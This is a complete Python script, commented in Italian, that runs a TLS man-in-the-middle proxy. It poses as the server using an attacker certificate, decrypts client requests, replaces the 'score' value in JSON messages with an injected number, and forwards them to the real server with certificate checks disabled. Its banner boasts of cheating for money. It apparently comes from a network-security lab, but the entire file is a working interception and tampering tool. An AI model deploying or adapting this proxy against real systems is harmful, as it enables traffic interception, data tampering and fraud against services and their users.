import socket, ssl, threading, json

LISTEN_PORT = 9000
REAL_SERVER = ('10.0.0.1', 8443)

INJECT_SCORE = 999

# Contesto Server Falso (per ingannare h2)
fake_server_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
# 'ssl.PROTOCOL_TLS_SERVER' è una costante che imposta automaticamente l'ambiente con le best practice necessarie a chi deve fare la parte del Server
fake_server_ctx.maximum_version = ssl.TLSVersion.TLSv1_2 
fake_server_ctx.load_cert_chain("atk_cert/attacker.crt", "atk_cert/attacker.key")

# Contesto Client (per parlare col h1)
client_ctx = ssl.create_default_context()
client_ctx.maximum_version = ssl.TLSVersion.TLSv1_2
client_ctx.check_hostname = False	# Ignora se il dominio del certificato non combacia con l'IP (evito crash)
client_ctx.verify_mode = ssl.CERT_NONE	# Accetto qualsiasi certificato mi venga presentato dal Server (evito crash)


def handle_client(client_sock):
    try:
        # Accetta connessione da h1 e decifra
        victim = fake_server_ctx.wrap_socket(client_sock, server_side=True)	# Wrap della Socket TCP nel contesto fake, con comportamento da Server per l'HS TLS 
        data = victim.recv(4096).decode()	# Decodifica da byte a string
        
        # --- LOGICA DI ATTACCO JSON ---
        hacked_data = data
        try:
            # Lettura del JSON
            req = json.loads(data)	# Tentativo di conversione della stringa di testo intercettata in un dizionario Python
            
            # Qui si specifica che l'attacco si verifica SOLO se il pacchetto ha come azione "SCORE"
            if req.get("action") == "SCORE":
                print(f"[MITM] Intercettato punteggio di {req.get('username')}: {req.get('score')}")
                
                # Uso INJECT_SCORE, variabile globale impostata all'avvio, per modificare il punteggio
                req['score'] = int(INJECT_SCORE)
                
                # Ricostruzione del JSON modificato
                hacked_data = json.dumps(req)
                print(f"[MITM] Modificato in: {req['score']} (Target: {req.get('username')})")
            
                
        except json.JSONDecodeError:
            print("[MITM] Errore parsing JSON, inoltro dati grezzi.")
        except Exception as e:
            print(f"[MITM] Errore logica attacco: {e}")
        # ---------------------------

        # Connessione al server vero e inoltro dei dati (modificati o no)
        real_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)	
        # P.S: Con la prima costante dichiaro che userò indirizzi IPv4, con la seconda che il protocollo di livello trasporto è TCP
        real_server = client_ctx.wrap_socket(real_sock, server_hostname=REAL_SERVER[0])
        real_server.connect(REAL_SERVER)
        real_server.send(hacked_data.encode())
        
        # Ricezione risposta dal server vero e inoltro di questa al client per completare lo scambio
        resp = real_server.recv(4096)
        victim.send(resp)

        real_server.close() 
        victim.close()
    except Exception as e: print(f"Errore in handleclient: {e}")

def start():
    global INJECT_SCORE
    
    # -- MENU ATTACCANTE --
    print(r"""
      _______ _       _____   _____  _____   ______  ____     __
     |__   __| |     / ____| |  __ \|  __ \ / __ \ \/  /\ \   / /
        | |  | |    | (___   | |__) | |__) | |  | \   /  \ \_/ / 
        | |  | |     \___ \  |  ___/|  _  /| |  |  > <    \   /  
        | |  | |____ ____) | | |    | | \ \| |__| / . \    | |   
        |_|  |______|_____/  |_|    |_|  \_\\____/_/ \_\   |_|   
                                                                       
        $$$ Modifichiamo pacchetti, alziamo gli score e facciamo i soldi $$$
               (Perché giocare onestamente non ha mai arricchito nessuno :D)
    """)
    print("\n---- x.x CONFIGURAZIONE ATTACCO x.x ----")
    user_input = input("Inserisci il punteggio da iniettare: ")
    
    if user_input.strip():
        try:
            INJECT_SCORE = int(user_input.strip())
        except ValueError:
            print("Input non valido. Uso il default (= 999)")
            
    print(f"[*] Payload configurato. Inietterò {INJECT_SCORE} punti")
    print("------------------------------------------\n")


    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)	
    # 'SO_REUSEADDR' evita l'errore "Address already in use", permettendo di riavviare lo script riutilizzando la porta "congelata", ignorando il blocco "TIME_WAIT"
    # 'socket.SQL_SOCKET', d'altro canto, specifica a chi applicare questa modifica (qui al socket in generale, e non a un protocollo specifico sottostante come TCP o IPv4).
    s.bind(('0.0.0.0', LISTEN_PORT))
    s.listen(5)		# '5' è la dimensione della coda di listen
    print(f"[*] TLS PROXY in ascolto sulla porta {LISTEN_PORT}...")
    
    while True:
        c, _ = s.accept()	# 'c' è il nuovo socket tra il proxy e il client, mentre '_' è IP e porta sorgente del client (inutile) 
        threading.Thread(target=handle_client, args=(c,)).start()	# Uso i Thread nell'ottica di poter gestire più vittime (client) alla volta

if __name__ == '__main__': start()
